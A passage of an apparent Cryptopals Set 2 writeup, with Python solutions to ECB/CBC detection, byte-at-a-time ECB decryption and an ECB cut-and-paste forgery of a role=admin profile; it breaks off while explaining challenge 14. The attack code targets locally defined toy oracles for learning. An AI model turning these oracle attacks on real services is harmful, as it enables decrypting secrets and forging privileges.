    ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    xored <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(plaintext), keysize):
        xor_list <span style="color:#f92672">=</span> [(b1 <span style="color:#f92672">^</span> b2)<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(PKCS7_pad(plaintext[i:i<span style="color:#f92672">+</span>keysize], keysize), previous)]
        xored <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(xor_list)
        cipher <span style="color:#f92672">=</span> AES_ECB_encrypt(xored, key)
        ciphertext <span style="color:#f92672">+=</span> cipher
        previous <span style="color:#f92672">=</span> cipher
        
    <span style="color:#66d9ef">return</span> ciphertext
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)

<span style="color:#75715e"># Enter a repeating text.</span>
text <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;8.txt&#34;</span>)<span style="color:#f92672">.</span>read()

<span style="color:#75715e"># Prepend and append random bytes to the text    </span>
plaintext <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>))
plaintext <span style="color:#f92672">+=</span> text<span style="color:#f92672">.</span>encode()
plaintext <span style="color:#f92672">+=</span> os<span style="color:#f92672">.</span>urandom(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">11</span>))

flag <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)
<span style="color:#66d9ef">if</span> flag <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrypting using AES ECB Encryption.&#34;</span>)
    ciphertext <span style="color:#f92672">=</span> AES_ECB_encrypt(plaintext, key)
<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrypting using AES CBC Encryption.&#34;</span>)
    ciphertext <span style="color:#f92672">=</span> AES_CBC_encrypt(plaintext, os<span style="color:#f92672">.</span>urandom(AES<span style="color:#f92672">.</span>block_size), key)
    
<span style="color:#66d9ef">if</span> detect_AES_ECB(ciphertext):
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Ciphertext is AES ECB encrypted.&#34;</span>)
<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Ciphertext is AES CBC encrypted.&#34;</span>)
</code></pre></div><p>Encrypting using AES CBC Encryption.
Ciphertext is AES CBC encrypted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(True)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-12-byte-at-a-time-ecb-decryption-simple">Challenge 12: Byte-at-a-time ECB decryption (Simple)</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/12">Link</a></p>
<blockquote>
<p>Copy your oracle function to a new function that encrypts buffers under ECB mode using a consistent but unknown key (for instance, assign a single random key, once, to a global variable).<br>
Now take that same function and have it append to the plaintext, BEFORE ENCRYPTING, the following string:<br>
<strong>Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkg</strong><br>
<strong>aGFpciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBq</strong><br>
<strong>dXN0IHRvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUg</strong><br>
<strong>YnkK</strong><br>
Base64 decode the string before appending it.<br>
Do not base64 decode the string by hand; make your code do it. The point is that you don&rsquo;t know its contents.<br>
What you have now is a function that produces:<br>
<strong>AES-128-ECB(your-string || unknown-string, random-key)</strong><br>
It turns out: you can decrypt &ldquo;unknown-string&rdquo; with repeated calls to the oracle function!<br>
Here&rsquo;s roughly how:</p>
</blockquote>
<ol>
<li>Feed identical bytes of your-string to the function 1 at a time &mdash; start with 1 byte (&ldquo;A&rdquo;), then &ldquo;AA&rdquo;, then &ldquo;AAA&rdquo; and so on. Discover the block size of the cipher. You know it, but do this step anyway.</li>
<li>Detect that the function is using ECB. You already know, but do this step anyways.</li>
<li>Knowing the block size, craft an input block that is exactly 1 byte short (for instance, if the block size is 8 bytes, make &ldquo;AAAAAAA&rdquo;). Think about what the oracle function is going to put in that last byte position.</li>
<li>Make a dictionary of every possible last byte by feeding different strings to the oracle; for instance, &ldquo;AAAAAAAA&rdquo;, &ldquo;AAAAAAAB&rdquo;, &ldquo;AAAAAAAC&rdquo;, remembering the first block of each invocation.</li>
<li>Match the output of the one-byte-short input to one of the entries in your dictionary. You&rsquo;ve now discovered the first byte of unknown-string.</li>
<li>Repeat for the next byte.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
b64_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkgaGFpciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBqdXN0IHRvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUgYnkK&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Generating a pseudo random key, to be run only once.</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
</code></pre></div><p>The oracle as defined by the question.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES128</span>(text: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Oracle function to return ciphertext for secret string appended to plaintext.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">global</span> b64_string
    <span style="color:#66d9ef">global</span> random_key
    secret_string <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64_string)
    plaintext <span style="color:#f92672">=</span> text <span style="color:#f92672">+</span> secret_string
    cipher <span style="color:#f92672">=</span> AES_ECB_encrypt(plaintext, random_key)
    <span style="color:#66d9ef">return</span> cipher
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES_ECB_keysize</span>(AES: callable) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns keysize used by an AES ECB encryption function.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A random key long enough to decode the key size used in the encryption&#34;</span>
    
    <span style="color:#75715e"># Checks repetition of blocks.</span>
    <span style="color:#75715e"># Looks for increase in cipher length because the moment text length goes over blocksize, a new block is created of blocksize, padded.</span>
    <span style="color:#75715e"># Thus we can infer block size from the increase in length observed.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(text)):
        plaintext <span style="color:#f92672">=</span> text[:i] <span style="color:#f92672">+</span> text[:i]
        cipher <span style="color:#f92672">=</span> AES(plaintext<span style="color:#f92672">.</span>encode())
        <span style="color:#66d9ef">if</span> cipher[:i] <span style="color:#f92672">==</span> cipher[i:<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>i]:                          
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Key size used for the given ciphertext is {}&#34;</span><span style="color:#f92672">.</span>format(i))
            <span style="color:#66d9ef">return</span> i
</code></pre></div><p>The function is based on the steps provided in the question itself. We send a (blocksize - 1) length input. Since the secret string gets appended to our input, the first byte of the secret string will become the last byte of the block of our input.</p>
<p>For example,</p>
<p>    let:    </p>
<p>        input = template,  </p>
<p>        plaintext be the final input we send for encryption,  </p>
<p>        block size = 4,  </p>
<p>        secret string = &ldquo;scrt&rdquo;  </p>
<p>    if length(template) == block size,  </p>
<p>        template = &ldquo;AAAA&rdquo;  </p>
<p>        plaintext = AAAA-scrt  </p>
<p>    with input(our template) being one byte short,  </p>
<p>        template = &ldquo;AAA_&rdquo;  </p>
<p>            where, _ is the byte we will be filling in while brute forcing  </p>
<p>        plaintext = AAAs-crt\x01    (\x01 is the pad byte)  </p>
<p>Therefore, to break this, we find the ciphertext for template = &ldquo;AAA&rdquo; and then run a comparsion against &ldquo;AAAx&rdquo;, where x:=range(alphabets). Eventually, a comparison for &ldquo;AAAs&rdquo; will be made and it will return true. Thus, last byte has been decrypted.</p>
<p>What we have to keep in mind now is the fact that the discovered byte needs to be appended to the plaintext before we try to decrypt the next byte. The template would now be:</p>
<p>    template = &ldquo;AAs_&rdquo;  </p>
<p>        where, _ is the byte we will while brute forcing.</p>
<p>            s is the byte we discovered already.  </p>
<p>The previously discovered byte has to be added because:</p>
<p>    length(template) = block size - 2,  </p>
<p>    =&gt; template = &ldquo;AA&rdquo;  </p>
<p>       plaintext = AAsc-rt\x02\x02    (\x02 are the pad bytes)  </p>
<p>Therefore, to break this, we find the ciphertext for template = &ldquo;AAs&rdquo; and then run a comparsion against &ldquo;AAsx&rdquo;, where x:=range(alphabets). Eventually, a comparison for &ldquo;AAsc&rdquo; will be made and it will return true. Thus, two byte have now been decrypted.</p>
<p>This is done for the entirety of the secret string length.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">break_AES_ECB</span>(keysize: int, encryptor: callable) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Breaks AES ECB encryption for the encryptor function provided.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    deciphered <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    
    <span style="color:#75715e"># To get secret string length since 0 len input is provided, ciphertext only consists of secret string.</span>
    ciphertext <span style="color:#f92672">=</span> encryptor(deciphered)
    <span style="color:#75715e"># We run the loop upto the length of the secret string since that&#39;s what we have to discover.</span>
    run <span style="color:#f92672">=</span> len(ciphertext)
    
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, run<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
        <span style="color:#75715e"># Template is &#39;A&#39; multiplied by number of bytes not decrytpted yet.</span>
        template <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(run <span style="color:#f92672">-</span> i)
        <span style="color:#75715e"># Gets cipher for template</span>
        cipher <span style="color:#f92672">=</span> encryptor(template)
        
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
            <span style="color:#75715e"># Adds the deciphered bytes to the template</span>
            text <span style="color:#f92672">=</span> template <span style="color:#f92672">+</span> deciphered <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
            c <span style="color:#f92672">=</span> encryptor(text)
            <span style="color:#75715e"># Keysize used to refer to the block whose last character is made to be the appended string&#39;s 1st char.</span>
            <span style="color:#75715e"># Comparison between letters appended to the last byte and the cipher of the template only.</span>
            <span style="color:#66d9ef">if</span> c[run<span style="color:#f92672">-</span>keysize:run] <span style="color:#f92672">==</span> cipher[run<span style="color:#f92672">-</span>keysize:run]:
                deciphered <span style="color:#f92672">+=</span> chr(j)<span style="color:#f92672">.</span>encode()
                <span style="color:#66d9ef">break</span>
    
    <span style="color:#66d9ef">return</span> PKCS7_unpad(deciphered)
</code></pre></div><p>Get keysize to identify block size.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> AES_ECB_keysize(AES128)

<span style="color:#75715e"># Decipher appended input.</span>
deciphered <span style="color:#f92672">=</span> break_AES_ECB(keysize, AES128)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Given base64 encoded string was:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">{}&#34;</span><span style="color:#f92672">.</span>format(deciphered<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)))
</code></pre></div><p>Key size used for the given ciphertext is 16</p>
<p>Given base64 encoded string was:</p>
<p>Rollin&rsquo; in my 5.0</p>
<p>With my rag-top down so my hair can blow</p>
<p>The girlies on standby waving just to say hi</p>
<p>Did you stop? No, I just drove by</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(True)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-13-ecb-cut-and-paste">Challenge 13: ECB cut-and-paste</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/13">Link</a></p>
<blockquote>
<p>Write a k=v parsing routine, as if for a structured cookie.<br>
The routine should take:<br>
<strong>foo=bar&amp;baz=qux&amp;zap=zazzle</strong><br>
&hellip; and produce:<br>
<strong>{</strong><br>
<strong>foo: &lsquo;bar&rsquo;,</strong><br>
<strong>baz: &lsquo;qux&rsquo;,</strong><br>
<strong>zap: &lsquo;zazzle&rsquo;</strong><br>
<strong>}</strong><br>
(you know, the object; I don&rsquo;t care if you convert it to JSON).<br>
Now write a function that encodes a user profile in that format, given an email address. You should have something like:<br>
<strong>profile_for(&ldquo;<a href="mailto:foo@bar.com">foo@bar.com</a>&rdquo;)</strong><br>
&hellip; and it should produce:<br>
<strong>{ email: &lsquo;<a href="mailto:foo@bar.com">foo@bar.com</a>&rsquo;,</strong><br>
<strong>uid: 10,</strong><br>
<strong>role: &lsquo;user&rsquo;</strong><br>
<strong>}</strong><br>
&hellip; encoded as:<br>
<strong><a href="mailto:email=foo@bar.com">email=foo@bar.com</a>&amp;uid=10&amp;role=user</strong><br>
Your &ldquo;profile_for&rdquo; function should not allow encoding metacharacters (&amp; and =).<br>
Eat them, quote them, whatever you want to do, but don&rsquo;t let people set their email address to &ldquo;<a href="mailto:foo@bar.com">foo@bar.com</a>&amp;role=admin&rdquo;.<br>
Now, two more easy functions. Generate a random AES key, then: Encrypt the encoded user profile under the key; &ldquo;provide&rdquo; that to the &ldquo;attacker&rdquo;.<br>
Decrypt the encoded user profile and parse it.<br>
Using only the user input to profile_for() (as an oracle to generate &ldquo;valid&rdquo; ciphertexts) and the ciphertexts themselves, make a role=admin profile</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><p>A shot at decoding the string into the dictionary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">string_set <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;foo=bar&amp;baz=qux&amp;zap=zazzle&#34;</span>
dictionary <span style="color:#f92672">=</span> {key:val <span style="color:#66d9ef">for</span> key, val <span style="color:#f92672">in</span> (element<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;=&#39;</span>) <span style="color:#66d9ef">for</span> element <span style="color:#f92672">in</span> string_set<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&amp;&#39;</span>))}
dictionary
</code></pre></div><p>{&lsquo;foo&rsquo;: &lsquo;bar&rsquo;, &lsquo;baz&rsquo;: &lsquo;qux&rsquo;, &lsquo;zap&rsquo;: &lsquo;zazzle&rsquo;}</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Generating a pseudo random key, to be run only once.</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parser</span>(user: dict, encode: bool) <span style="color:#f92672">-&gt;</span> dict:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Parse the given string into a dictionary of format User.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> encode <span style="color:#f92672">==</span> True:
        parsed_string <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&amp;&#34;</span><span style="color:#f92672">.</span>join(key<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;:&#34;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">+</span>val <span style="color:#66d9ef">for</span> key, val <span style="color:#f92672">in</span> zip(user<span style="color:#f92672">.</span>keys(), user<span style="color:#f92672">.</span>values()))
        <span style="color:#66d9ef">return</span> parsed_string<span style="color:#f92672">.</span>encode()
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> {key:val <span style="color:#66d9ef">for</span> key, val <span style="color:#f92672">in</span> (element<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;=&#39;</span>) <span style="color:#66d9ef">for</span> element <span style="color:#f92672">in</span> user<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&amp;&#39;</span>))}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">profile_for</span>(val: str) <span style="color:#f92672">-&gt;</span> dict:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns a user profile for given email.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    val <span style="color:#f92672">=</span> val<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
    user <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;email:&#34;</span>: val, <span style="color:#e6db74">&#34;uid:&#34;</span>: <span style="color:#e6db74">&#34;10&#34;</span>, <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>}
    <span style="color:#66d9ef">return</span> parser(user, True)
</code></pre></div><p>The oracle as defined by the question.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">oracle</span>(email: str) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns a new profile for the given email in AES ECB encrypted form.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    encoded_profile <span style="color:#f92672">=</span> AES_ECB_encrypt(profile_for(email), random_key)
    <span style="color:#66d9ef">return</span> encoded_profile
</code></pre></div><p>Test if the oracle works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">email <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;lol@gmail.com&#34;</span>
decoded_profile <span style="color:#f92672">=</span> PKCS7_unpad(AES_ECB_decrypt(oracle(email), random_key))
profile <span style="color:#f92672">=</span> parser(decoded_profile<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>), False)
decoded_profile<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</code></pre></div><p>&lsquo;<a href="mailto:email=lol@gmail.com">email=lol@gmail.com</a>&amp;amp;amp;amp;amp;amp;amp;uid=10&amp;amp;amp;amp;amp;amp;amp;role=user\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c&rsquo;</p>
<p>The idea here is to get the encrypted bytes of the parameter(&ldquo;admin&rdquo;) we have to write into the string, and then insert those bytes as is into a benign ciphertext.</p>
<p>We generate an email as follows:<br>
We fill garbage value uptil the starting block(since &ldquo;email=&rdquo; is at the beginning of the string) is completed and then append the parameter(&ldquo;admin&rdquo;) in a padded state so that we get a fresh, whole block of the parameter encrypted.</p>
<p>Now we inject this into the string as follows:<br>
We input an email such that &ldquo;&amp;role=&rdquo; are the last bytes of a block and &ldquo;user&rdquo; comes in a new block(would be the last block since &ldquo;user&rdquo; is at the end of the string). This last block is replaced by the block of cipher we generated for the parameter.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>

<span style="color:#75715e"># Get encrypted bytes with &#34;admin&#34;.</span>
email <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(keysize<span style="color:#f92672">-</span>len(<span style="color:#e6db74">&#34;email=&#34;</span>)) <span style="color:#f92672">+</span> PKCS7_pad(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;admin&#34;</span>, keysize)
cipher <span style="color:#f92672">=</span> oracle(email)
encoded_admin_bytes <span style="color:#f92672">=</span> cipher[keysize:keysize<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]

<span style="color:#75715e"># Calculate the number of blocks taken up by the text and then generate an email that completes the block so the admin parameter can be appended in the new block.</span>
num_blocks <span style="color:#f92672">=</span> int((len(<span style="color:#e6db74">&#34;&amp;uid=10&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;email=&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;&amp;role=&#34;</span>))<span style="color:#f92672">/</span>keysize) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
email <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">*</span>(num_blocks<span style="color:#f92672">*</span>keysize <span style="color:#f92672">-</span> (len(<span style="color:#e6db74">&#34;&amp;uid=10&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;email=&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;&amp;role=&#34;</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>))<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;@gmail.com&#34;</span>
cipher <span style="color:#f92672">=</span> oracle(email)
<span style="color:#75715e"># Add the encoded paramter bytes to the ciphertext.</span>
modified_cipher <span style="color:#f92672">=</span> cipher[:<span style="color:#ae81ff">48</span>] <span style="color:#f92672">+</span> encoded_admin_bytes

cracked_cipher_plaintext <span style="color:#f92672">=</span> parser(PKCS7_unpad(AES_ECB_decrypt(modified_cipher, random_key))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>), False)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(cracked_cipher_plaintext[<span style="color:#e6db74">&#39;role&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-14-byte-at-a-time-ecb-decryption-harder">Challenge 14: Byte-at-a-time ECB decryption (Harder)</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/14">Link</a></p>
<blockquote>
<p>Take your oracle function from #12.<br>
Now generate a random count of random bytes and prepend this string to every plaintext.<br>
You are now doing:<br>
<strong>AES-128-ECB(random-prefix || attacker-controlled || target-bytes, random-key)</strong><br>
Same goal: decrypt the target-bytes.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> math
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
b64_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkgaGFpciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBqdXN0IHRvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUgYnkK&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Pseudo random key and prefix string.</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
random_string <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">255</span>))
</code></pre></div><p>The oracle as defined by the question. Only difference from #12 is that it prepends the text with random string of fixed length.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">AES128_harder</span>(text: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Oracle function to return ciphertext for random string and secret string, prepended and appended respectively, to plaintext.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">global</span> b64_string, random_key, random_string
    
    secret_string <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64_string)
    plaintext <span style="color:#f92672">=</span> random_string <span style="color:#f92672">+</span> text <span style="color:#f92672">+</span> secret_string
    cipher <span style="color:#f92672">=</span> AES_ECB_encrypt(plaintext, random_key)
    <span style="color:#66d9ef">return</span> cipher
</code></pre></div><p>We need to account for the random string being prepended. If it wasn&rsquo;t there, this question would be the exact same as #12(a secret string being appended to our input).<br>
Therefore, if we were to neutralise this random string, we can follow the same approach as that of #12.</p>
<p>We find out the random string&rsquo;s length by calculating the common prefix appended in every ciphertext. This common prefix is the random string. We get it&rsquo;s length.<br>
We then find out the number of blocks it&rsquo;s taking and how much padding we need so that our input is put into a new block when being encrypted.<br>
Once we are able to reach the point where the input begins in a new block, we can say that the random string has been neutralised, making this question essentially the same as #12.</p>
